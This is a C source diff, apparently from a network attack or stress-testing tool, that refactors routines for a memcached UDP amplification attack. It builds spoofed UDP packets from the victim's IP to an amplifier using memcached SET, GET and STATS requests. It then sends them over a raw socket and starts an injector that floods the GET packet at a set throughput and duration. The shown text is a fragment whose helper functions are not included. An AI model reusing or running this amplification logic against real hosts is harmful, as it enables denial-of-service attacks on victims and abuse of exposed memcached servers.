@@ -23,8 +23,7 @@ static AttackPlan * createAttackDataGETSET( AttackDraft *draft )
   newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
   arg = MEMCACHED_GET;
   newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
-  newData->initialThroughput = draft->initialThroughput;
-  newData->incrementAttack = draft->typeThroughput;
+  newData->initialThroughput = draft->throughput;
   newData->timer = draft->timer;
 
   return newData;
@@ -32,38 +31,28 @@ static AttackPlan * createAttackDataGETSET( AttackDraft *draft )
 
 static AttackPlan * createAttackDataSTATS( AttackDraft *draft )
 {
-  AttackPlan *newData;
-  int arg;
+    AttackPlan *newData;
+    int arg;
 
-  memalloc( (void *)&newData, sizeof( AttackPlan ) );
-  arg = MEMCACHED_STAT;
-  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedBinary, &arg );
-  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
-  newData->initialThroughput = draft->initialThroughput;
-  newData->incrementAttack = draft->typeThroughput;
-  newData->timer = draft->timer;
+    memalloc( (void *)&newData, sizeof( AttackPlan ) );
+    arg = MEMCACHED_STAT;
+    newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedBinary, &arg );
+    newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
+    newData->initialThroughput = draft->throughput;
+    newData->timer = draft->timer;
 
-  return newData;
-}
-
-void prepareServerWithData( Packet *p_pkt )
-{
-    if( SendPacket(p_pkt) < 0 )
-    {
-        Efatal(ERROR_MEMCACHED, "error memcached\n");
-    }
-
-
+    return newData;
 }
 
 void executeAttack( AttackPlan * atkData )
 {
-  
-    if( SendPacket(atkData->setPacket) < 0 )
+    int sock = CreateSocket(RAW, BLOCK);
+    if( SendPacket(sock, atkData->setPacket) < 0 )
     {
         Efatal(ERROR_MEMCACHED, "error memcached\n");
-    } 
-    StartNetunoInjector( atkData->getPacket, atkData->initialThroughput, atkData->timer, atkData->incrementAttack);
+    }
+    CloseSocket(sock);
+    StartNetunoInjector( atkData->getPacket, atkData->initialThroughput, atkData->timer);
   
 }
 
